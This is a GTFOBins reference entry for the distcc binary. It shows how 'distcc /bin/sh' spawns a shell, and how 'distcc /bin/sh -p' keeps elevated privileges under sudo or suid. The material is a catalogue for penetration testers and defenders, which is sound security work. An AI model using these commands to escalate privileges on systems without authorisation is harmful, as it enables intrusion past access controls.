<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/distcc -->
---
functions:
  shell:
  - code: |-
      distcc /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          distcc /bin/sh -p
      unprivileged:
...
